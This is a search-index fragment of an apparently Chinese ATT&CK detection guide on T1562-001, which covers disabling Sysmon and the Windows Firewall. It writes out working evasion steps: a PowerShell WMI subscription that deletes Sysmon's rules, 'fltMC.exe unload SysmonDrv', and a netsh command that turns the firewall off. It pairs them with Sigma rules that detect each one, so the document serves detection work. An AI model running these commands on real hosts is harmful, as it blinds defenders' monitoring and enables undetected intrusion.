\u9632\u62a4\u89e3\u51b3\u65b9\u6848\u4f1a\u91cd\u70b9\u5173\u6ce8\u6b63\u5728\u521b\u5efa\u6216\u4fee\u6539\u7684WMI\u6c38\u4e45\u4e8b\u4ef6\u3002 \u5378\u8f7dSysmonDrv\u9a71\u52a8 \u6211\u4eec\u53ef\u4ee5\u91c7\u53d6\u7684\u53e6\u4e00\u4e2a\u64cd\u4f5c\u5c31\u662f\u5378\u8f7dSysmonDrv\u9a71\u52a8\uff0c\u8be5\u9a71\u52a8\u53ef\u4ee5\u4e3aSysmon\u63d0\u4f9b\u5173\u4e8e\u6240\u6709\u78c1\u76d8\u64cd\u4f5c\u7684\u4fe1\u606f\uff0c\u7136\u540e\u5c06\u4fe1\u606f\u5199\u5165\u4e8b\u4ef6\u65e5\u5fd7\u4e2d\u3002\u5982\u524d\u6587\u6240\u8ff0\uff0c\u8be5\u9a71\u52a8\u6709\u4e2a\u552f\u4e00\u7684altitude\u7f16\u53f7\uff0c\u5982\u679c\u6211\u4eec\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c\uff0c\u5c31\u53ef\u4ee5\u5378\u8f7d\u8be5\u9a71\u52a8\uff0c\u7136\u540eSysmon\u57fa\u672c\u4e0a\u5c31\u4f1a\u5b8c\u5168\u5904\u4e8e\u5931\u6548\u72b6\u6001\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 fltmc.exe \u5de5\u5177\u6765\u5378\u8f7d\u9a71\u52a8\uff0c\u5982\u4e0b\u6240\u793a\uff0c\u6211\u4eec\u901a\u8fc7altitudde\u7f16\u53f7\u8bc6\u522b\u51fa\u4e86\u9690\u85cf\u9a71\u52a8\uff0c\u5e76\u6210\u529f\u5378\u8f7d\u8be5\u9a71\u52a8\u3002 \u5173\u95edsysmon\u670d\u52a1\uff08\u7ba1\u7406\u5458\u6743\u9650\uff09 \u901a\u8fc7windows\u4efb\u52a1\u7ba1\u7406\u5668\uff0c\u7ba1\u7406\u5458\u6743\u9650\u5173\u95edsysmon\u670d\u52a1\u3002 \u68c0\u6d4b\u65e5\u5fd7 sysmon\u65e5\u5fd7\u3001Windows-WMI-Activity\u65e5\u5fd7\uff0csystem\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u5220\u9664\u914d\u7f6e\u98791 $query = \"SELECT * FROM RegistryKeyChangeEvent \" + \"WHERE Hive ='HKEY_LOCAL_MACHINE' \" + \"AND KeyPath ='SYSTEM\\\\CurrentControlSet\\\\Services\\\\SysmonDrv\\\\Parameters'\" Register-WMIEvent -Query $query -Action { Write-host \"Sysmon config updated, deleting config.\" Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters\" -Name \"Rules\" } \u9700\u8981\u6ce8\u610f\u4e00\u70b9\uff0c\u6b64\u65f6Sysmon\u4f1a\u6062\u590d\u9ed8\u8ba4\u914d\u7f6e\uff0c\u56e0\u6b64\u4f1a\u8bb0\u5f55\u8fdb\u7a0b\u521b\u5efa\u548c\u8fdb\u7a0b\u7ec8\u6b62\u4e8b\u4ef6\u3002 \u5378\u8f7dSysmonDrv\u9a71\u52a81 Windows PowerShell \u7248\u6743\u6240\u6709 (C) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 PS C:\\Users\\Administrator> fltMC.exe \u7b5b\u9009\u5668\u540d\u79f0 \u6570\u5b57\u5b9e\u4f8b \u9ad8\u5ea6 \u6846\u67b6 ------------------------------ ------------- ------------ ----- SysmonDrv 2 385201 0 luafv 1 135000 0 PS C:\\Users\\Administrator> fltMC.exe unload SysmonDrv PS C:\\Users\\Administrator> fltMC.exe \u7b5b\u9009\u5668\u540d\u79f0 \u6570\u5b57\u5b9e\u4f8b \u9ad8\u5ea6 \u6846\u67b6 ------------------------------ ------------- ------------ ----- luafv 1 135000 0 PS C:\\Users\\Administrator> \u5173\u95edsysmon\u670d\u52a1 \u4efb\u52a1\u7ba1\u7406\u5668>\u670d\u52a1>sysmon\u670d\u52a1>\u505c\u6b62 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 \u5220\u9664\u914d\u7f6e\u98792 title: \u5220\u9664sysmon\u914d\u7f6e\u9879 description: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: product: windows service: WMI\u65e5\u5fd7 detection: selection: EventID: 5860 keyword: '\u547d\u540d\u7a7a\u95f4 = root\\cimv2\uff1bNotificationQuery = SELECT * FROM RegistryKeyChangeEvent WHERE Hive ='HKEY_LOCAL_MACHINE' AND KeyPath ='SYSTEM\\\\CurrentControlSet\\\\Services\\\\SysmonDrv\\\\Parameters'\uff1bPossibleCause = Temporary' timeframe: last 1m condition: selection level: medium \u5378\u8f7dSysmonDrv\u9a71\u52a8\u2014sysmon title: fltmc\u5378\u8f7dsysmon description: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: product: windows service: sysmon detection: selection1: EventID: 1 Image: 'C:\\Windows\\SysWOW64\\fltMC.exe' CommandLine: '\"C:\\Windows\\system32\\fltMC.exe\" unload Sysmon*' ParentImage: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe selection2: EventID: 255 ID: 'DriverCommunication' Description: 'Failed to retrieve events - Last error: \u7531\u4e8e\u7ebf\u7a0b\u9000\u51fa\u6216\u5e94\u7528\u7a0b\u5e8f\u8bf7\u6c42\uff0c\u5df2\u4e2d\u6b62 I/O \u64cd\u4f5c\u3002' timeframe: last 1m condition: all of them level: medium \u5173\u95edsysmon\u670d\u52a12 title: \u4ee5\u5176\u4ed6\u65b9\u5f0f\u5173\u95edsysmon\u670d\u52a1 description: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: product: windows service: system\u3001sysmon detection: selection1: EventID: 4 #sysmon\u65e5\u5fd7 State: Stopped selection2: 7036 #system\u65e5\u5fd7 keyword: 'Sysmon* \u670d\u52a1\u5904\u4e8e \u505c\u6b62 \u72b6\u6001\u3002' selection3: 7040 #system\u65e5\u5fd7 keyword: 'Sysmon64 \u670d\u52a1\u7684\u542f\u52a8\u7c7b\u578b\u4ece \u81ea\u52a8\u542f\u52a8 \u66f4\u6539\u4e3a \u5df2\u7981\u7528\u3002' selection4: 7034 #system condition: selection or selection2 or selection3 or selection4 level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1562-001 https://attack.mitre.org/techniques/T1562/001/ \u5ba1\u6838\u7b56\u7565\u76f8\u5173\u4ecb\u7ecd https://www.malwarearchaeology.com/logging \u5982\u4f55\u89c4\u907fsysmon https://www.anquanke.com/post/id/161630","title":"T1562-001-windows-\u7ed5\u8fc7sysmon"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#t1562-001-windows-sysmon","text":"","title":"T1562-001-windows-\u7ed5\u8fc7sysmon"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002 \u5728\u57fa\u4e8e\u7279\u5f81\u76d1\u6d4b\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u963b\u6b62\u76d1\u6d4b\u7279\u5f81\u76f8\u5173\u7684\u6570\u636e\u88ab\u53d1\u9001\u51fa\u53bb\uff0c\u4ee5\u4fbf\u4e8e\u963b\u6b62\u5b89\u5168\u4eba\u5458\u8fdb\u884c\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u6709\u5f88\u591a\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u7684\u8fdb\u7a0b\uff08splunk\u8f6c\u53d1\u5668\u3001Filebate\u3001rsyslog\u7b49\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_1","text":"\u4f17\u6240\u5468\u77e5\uff0csysmon\u53ef\u4ee5\u5e2e\u52a9\u5b89\u5168\u4eba\u5458\u8bb0\u5f55\u5f88\u591a\u5b89\u5168\u4e8b\u4ef6\uff0c\u76ee\u524dsysmon\u6700\u65b0\u7248\u672c\u5df2\u7ecf\u662f10.X\u7248\u672c\u3002\u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bb2\uff0c\u4ed6\u4eec\u53ef\u80fd\u9700\u8981\u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u662f\u5426\u5b58\u5728sysmon\u3002\u901a\u5e38\uff0c\u653b\u51fb\u8005\u662f\u4e0d\u4f1a\u53bb\u68c0\u6d4b\u4ed6\u4eec\u5165\u4fb5\u7684\u4e3b\u673a\u4e0a\u662f\u5426\u5b58\u5728sysmon\u3002 \u5982\u4f55\u68c0\u6d4b\u88ab\u5165\u4fb5\u7684\u4e3b\u673a\u662f\u5426\u5b58\u5728sysmon\uff0c\u5f88\u591a\u653b\u51fb\u8005\u4e00\u822c\u6267\u884c\u4ee5\u4e0b\u7684\u4e00\u79cd\u64cd\u4f5c\uff1a \u679a\u4e3e\u8fdb\u7a0b\uff1b \u679a\u4e3e\u670d\u52a1\uff1b \u679a\u4e3eC:\\Windows\\System32\\Drivers\u4e0b\u7684\u9a71\u52a8\uff1b \u4f46\u662f\uff0c\u4f60\u5e94\u8be5\u77e5\u9053sysmon\u53ef\u4ee5\u5b9e\u73b0\u4ee5\u4e0b\u529f\u80fd\uff1a\u7528\u6237\u53ef\u4ee5\u5728\u5176\u4e2d\u66f4\u6539\u53ef\u6267\u884c\u6587\u4ef6\u548c\u9a71\u52a8\u6587\u4ef6\u7684\u540d\u79f0\uff0c\u4ee5\u4fbf\u5176\u5728\u7cfb\u7edf\u4e2d\u7684\u5b58\u5728\u8fdb\u884c\u6a21\u7cca\u5904\u7406\u3002 \u4e0d\u8fc7\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528fltmc.exe\u67e5\u770b\u5176altitude\u53f7\u7801\uff0csysmon\u7684altitude\u53f7\u7801\u662f385201\uff0c\u56fa\u5b9a\u4e0d\u53d8\u7684\u3002 \u4f7f\u7528fltmc.exe\u5f97\u5230\u7684altitude\u53f7\uff1a Windows PowerShell \u7248\u6743\u6240\u6709 (C) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 PS C:\\Users\\Administrator> fltmc.exe \u7b5b\u9009\u5668\u540d\u79f0 \u6570\u5b57\u5b9e\u4f8b \u9ad8\u5ea6 \u6846\u67b6 ------ SysmonDrv 2 385201 0 luafv 1 135000 0 \u5728Mimikatz\u4e2d\u4f7f\u7528misc::mflt\u547d\u4ee4\u5f97\u5230\u7684altitude\u53f7\uff1a mimikatz # misc::mflt 0 2 385201 SysmonDrv 0 1 135000 luafv \u5173\u4e8e\u66f4\u591a\u7684\u5982\u4f55\u68c0\u6d4b\u88ab\u5165\u4fb5\u7684\u4e3b\u673a\u662f\u5426\u5b58\u5728sysmon\uff0c\u4f60\u53ef\u4ee5\u53c2\u8003\uff1a https://anquan.baidu.com/article/350\uff0c\u5982\u4f55\u68c0\u6d4bsysmon\u4e0d\u662f\u672c\u6587\u7684\u91cd\u70b9.","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmon","text":"\u76ee\u524d\uff0c\u653b\u51fb\u8005\u67092\u4e2a\u7ed5\u8fc7sysmon\u7684\u65b9\u6cd5\uff0c\u7b2c\u4e00\u4e2a\u662f\u5728\u5229\u7528sysmon\u8fdb\u7a0b\u4e2d\u7684\u76f2\u70b9\uff0c\u7b2c\u4e8c\u79cd\u5219\u662f\u76f4\u63a5\u7981\u7528sysmon\u3002","title":"\u7ed5\u8fc7Sysmon\u7684\u4e24\u79cd\u65b9\u6cd5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_2","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u5220\u9664\u6ce8\u518c\u8868\u4e2d\u7684\u89c4\u5219\u9879\uff0c\u6b64\u65f6\uff0c Sysmon\u5728\u53d1\u73b0\u6ce8\u518c\u8868\u88ab\u66f4\u6539\u540e\uff0c\u5b83\u5c06\u81ea\u52a8\u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e\u3002\u7531\u4e8e\u6b64\u65f6\u6ca1\u6709\u4efb\u4f55\u5b89\u5168\u68c0\u6d4b\u89c4\u5219\u5b58\u5728\uff0c\u5b83\u5c06\u6682\u65f6\u5931\u53bb\u9632\u62a4\u80fd\u529b\uff0c\u4e0d\u8fc7\u5931\u6548\u65f6\u95f4\uff0c\u53d6\u51b3\u4e8e\u914d\u7f6e\u7684\u7ef4\u62a4\u65b9\u5f0f\u3002\u5982\u679c\u914d\u7f6e\u7531Ansible\uff0cChef\u6216DSC\u7b49\u914d\u7f6e\u7ba1\u7406\u7cfb\u7edf\u7ba1\u7406\uff0c\u53ef\u80fd\u9700\u8981\u51e0\u79d2\u5230\u51e0\u5206\u949f\u624d\u80fd\u5c06\u914d\u7f6e\u66f4\u6539\u56de\u539f\u59cb\u72b6\u6001\uff0c\u5982\u679c\u4f7f\u7528GPO\u6765\u7ba1\u7406\uff0c\u90a3\u4e48\u5f53GPO\u66f4\u65b0\u65f6\uff0c\u53ef\u4ee5\u572890\u5206\u949f\u5185\u6062\u590d\u539f\u59cb\u72b6\u6001\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5404\u79cdWindows\u6280\u672f\uff08\u5982.Net\u3001VBS\u3001PE\u6587\u4ef6\u7b49\uff09\u521b\u5efaVMI\u4e34\u65f6\u6027Consumer\u76d1\u63a7\u76f8\u5e94\u7684\u6ce8\u518c\u8868\u9879\uff0c\u5f53\u53d1\u73b0\u4fee\u6539\u64cd\u4f5c\u65f6\uff0c\u5219\u4f1a\u5220\u9664\u4fee\u6539\u6570\u636e\u6216\u8005\u91cd\u65b0\u8bbe\u7f6e\u8868\u9879\u5185\u5bb9\u3002\u4e4b\u6240\u4ee5\u4f7f\u7528\u4e34\u65f6\u7684Consumer\uff0c\u662f\u56e0\u4e3a\u5927\u591a\u6570\u9632\u62a4\u89e3\u51b3\u65b9\u6848\u4f1a\u91cd\u70b9\u5173\u6ce8\u6b63\u5728\u521b\u5efa\u6216\u4fee\u6539\u7684WMI\u6c38\u4e45\u4e8b\u4ef6\u3002","title":"\u5220\u9664\u914d\u7f6e\u9879"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmondrv","text":"\u6211\u4eec\u53ef\u4ee5\u91c7\u53d6\u7684\u53e6\u4e00\u4e2a\u64cd\u4f5c\u5c31\u662f\u5378\u8f7dSysmonDrv\u9a71\u52a8\uff0c\u8be5\u9a71\u52a8\u53ef\u4ee5\u4e3aSysmon\u63d0\u4f9b\u5173\u4e8e\u6240\u6709\u78c1\u76d8\u64cd\u4f5c\u7684\u4fe1\u606f\uff0c\u7136\u540e\u5c06\u4fe1\u606f\u5199\u5165\u4e8b\u4ef6\u65e5\u5fd7\u4e2d\u3002\u5982\u524d\u6587\u6240\u8ff0\uff0c\u8be5\u9a71\u52a8\u6709\u4e2a\u552f\u4e00\u7684altitude\u7f16\u53f7\uff0c\u5982\u679c\u6211\u4eec\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c\uff0c\u5c31\u53ef\u4ee5\u5378\u8f7d\u8be5\u9a71\u52a8\uff0c\u7136\u540eSysmon\u57fa\u672c\u4e0a\u5c31\u4f1a\u5b8c\u5168\u5904\u4e8e\u5931\u6548\u72b6\u6001\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 fltmc.exe \u5de5\u5177\u6765\u5378\u8f7d\u9a71\u52a8\uff0c\u5982\u4e0b\u6240\u793a\uff0c\u6211\u4eec\u901a\u8fc7altitudde\u7f16\u53f7\u8bc6\u522b\u51fa\u4e86\u9690\u85cf\u9a71\u52a8\uff0c\u5e76\u6210\u529f\u5378\u8f7d\u8be5\u9a71\u52a8\u3002","title":"\u5378\u8f7dSysmonDrv\u9a71\u52a8"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmon_1","text":"\u901a\u8fc7windows\u4efb\u52a1\u7ba1\u7406\u5668\uff0c\u7ba1\u7406\u5458\u6743\u9650\u5173\u95edsysmon\u670d\u52a1\u3002","title":"\u5173\u95edsysmon\u670d\u52a1\uff08\u7ba1\u7406\u5458\u6743\u9650\uff09"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_3","text":"sysmon\u65e5\u5fd7\u3001Windows-WMI-Activity\u65e5\u5fd7\uff0csystem\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_4","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#1","text":"$query = \"SELECT * FROM RegistryKeyChangeEvent \" + \"WHERE Hive ='HKEY_LOCAL_MACHINE' \" + \"AND KeyPath ='SYSTEM\\\\CurrentControlSet\\\\Services\\\\SysmonDrv\\\\Parameters'\" Register-WMIEvent -Query $query -Action { Write-host \"Sysmon config updated, deleting config.\" Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters\" -Name \"Rules\" } \u9700\u8981\u6ce8\u610f\u4e00\u70b9\uff0c\u6b64\u65f6Sysmon\u4f1a\u6062\u590d\u9ed8\u8ba4\u914d\u7f6e\uff0c\u56e0\u6b64\u4f1a\u8bb0\u5f55\u8fdb\u7a0b\u521b\u5efa\u548c\u8fdb\u7a0b\u7ec8\u6b62\u4e8b\u4ef6\u3002","title":"\u5220\u9664\u914d\u7f6e\u98791"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmondrv1","text":"Windows PowerShell \u7248\u6743\u6240\u6709 (C) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 PS C:\\Users\\Administrator> fltMC.exe \u7b5b\u9009\u5668\u540d\u79f0 \u6570\u5b57\u5b9e\u4f8b \u9ad8\u5ea6 \u6846\u67b6 ------------------------------ ------------- ------------ ----- SysmonDrv 2 385201 0 luafv 1 135000 0 PS C:\\Users\\Administrator> fltMC.exe unload SysmonDrv PS C:\\Users\\Administrator> fltMC.exe \u7b5b\u9009\u5668\u540d\u79f0 \u6570\u5b57\u5b9e\u4f8b \u9ad8\u5ea6 \u6846\u67b6 ------------------------------ ------------- ------------ ----- luafv 1 135000 0 PS C:\\Users\\Administrator>","title":"\u5378\u8f7dSysmonDrv\u9a71\u52a81"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmon_2","text":"\u4efb\u52a1\u7ba1\u7406\u5668>\u670d\u52a1>sysmon\u670d\u52a1>\u505c\u6b62","title":"\u5173\u95edsysmon\u670d\u52a1"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_5","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_6","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sigma","text":"","title":"sigma\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#2","text":"title: \u5220\u9664sysmon\u914d\u7f6e\u9879 description: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: product: windows service: WMI\u65e5\u5fd7 detection: selection: EventID: 5860 keyword: '\u547d\u540d\u7a7a\u95f4 = root\\cimv2\uff1bNotificationQuery = SELECT * FROM RegistryKeyChangeEvent WHERE Hive ='HKEY_LOCAL_MACHINE' AND KeyPath ='SYSTEM\\\\CurrentControlSet\\\\Services\\\\SysmonDrv\\\\Parameters'\uff1bPossibleCause = Temporary' timeframe: last 1m condition: selection level: medium","title":"\u5220\u9664\u914d\u7f6e\u98792"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmondrvsysmon","text":"title: fltmc\u5378\u8f7dsysmon description: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: product: windows service: sysmon detection: selection1: EventID: 1 Image: 'C:\\Windows\\SysWOW64\\fltMC.exe' CommandLine: '\"C:\\Windows\\system32\\fltMC.exe\" unload Sysmon*' ParentImage: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe selection2: EventID: 255 ID: 'DriverCommunication' Description: 'Failed to retrieve events - Last error: \u7531\u4e8e\u7ebf\u7a0b\u9000\u51fa\u6216\u5e94\u7528\u7a0b\u5e8f\u8bf7\u6c42\uff0c\u5df2\u4e2d\u6b62 I/O \u64cd\u4f5c\u3002' timeframe: last 1m condition: all of them level: medium","title":"\u5378\u8f7dSysmonDrv\u9a71\u52a8\u2014sysmon"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmon2","text":"title: \u4ee5\u5176\u4ed6\u65b9\u5f0f\u5173\u95edsysmon\u670d\u52a1 description: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: product: windows service: system\u3001sysmon detection: selection1: EventID: 4 #sysmon\u65e5\u5fd7 State: Stopped selection2: 7036 #system\u65e5\u5fd7 keyword: 'Sysmon* \u670d\u52a1\u5904\u4e8e \u505c\u6b62 \u72b6\u6001\u3002' selection3: 7040 #system\u65e5\u5fd7 keyword: 'Sysmon64 \u670d\u52a1\u7684\u542f\u52a8\u7c7b\u578b\u4ece \u81ea\u52a8\u542f\u52a8 \u66f4\u6539\u4e3a \u5df2\u7981\u7528\u3002' selection4: 7034 #system condition: selection or selection2 or selection3 or selection4 level: medium","title":"\u5173\u95edsysmon\u670d\u52a12"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_7","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_8","text":"MITRE-ATT&CK-T1562-001 https://attack.mitre.org/techniques/T1562/001/ \u5ba1\u6838\u7b56\u7565\u76f8\u5173\u4ecb\u7ecd https://www.malwarearchaeology.com/logging \u5982\u4f55\u89c4\u907fsysmon https://www.anquanke.com/post/id/161630","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/","text":"T1562-001-windows-\u505c\u6b62Windows\u9632\u5fa1\u670d\u52a1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002 \u95f4\u8c0d\u8f6f\u4ef6\u548c\u6076\u610f\u8f6f\u4ef6\u4ecd\u7136\u662f\u4e00\u4e2a\u4e25\u91cd\u7684\u95ee\u9898\uff0c\u5fae\u8f6f\u5f00\u53d1\u4e86\u5b89\u5168\u670d\u52a1\u5373Windows Defender\u548cWindows\u9632\u706b\u5899\uff0c\u534f\u52a9\u7528\u6237\u5bf9\u6297\u8fd9\u79cd\u5a01\u80c1\u3002\u5982\u679c\u5173\u95edWindows Defender\u6216Windows\u9632\u706b\u5899\uff0c\u5e94\u5f53\u5f15\u8d77\u7ba1\u7406\u5458\u7684\u6ce8\u610f\uff0c\u7acb\u5373\u6062\u590dwindows Defender\u6216windows\u9632\u706b\u5899\uff0c\u4f7f\u5176\u5904\u4e8e\u6b63\u5e38\u5de5\u4f5c\u72b6\u6001\uff0c\u8c03\u67e5\u5e76\u786e\u5b9a\u5f02\u5e38\u60c5\u51b5\u662f\u5426\u7531\u7528\u6237\u6b63\u5e38\u64cd\u4f5c\u5f15\u8d77\u7684\u3002 \u6d4b\u8bd5\u6848\u4f8b windows 7 DOS\u547d\u4ee4\u5173\u95edwindows\u9632\u706b\u5899\uff1anetsh advfilewall set publicprofile state off \u68c0\u6d4b\u65e5\u5fd7 windows system \u6d4b\u8bd5\u590d\u73b0 windows\u5173\u95ed\u9632\u706b\u5899\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4f46\u4e8b\u4ef6ID\u53ea\u6709\u4e00\u4e2a\u3002 net start mpssvc netsh advfilewall set publicprofile state off \u6d4b\u8bd5\u7559\u75d5 windows system\u4e8b\u4ef6ID7036 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u505c\u6b62Windows\u9632\u5fa1\u670d\u52a1 description: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: system detection: \u200b selection: \u200b EventID: 7036 \u200b Message: 'Windows Firewall \u670d\u52a1\u5904\u4e8e \u505c\u6b62 \u72b6\u6001\u3002' \u200b condition: selection level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1562-001 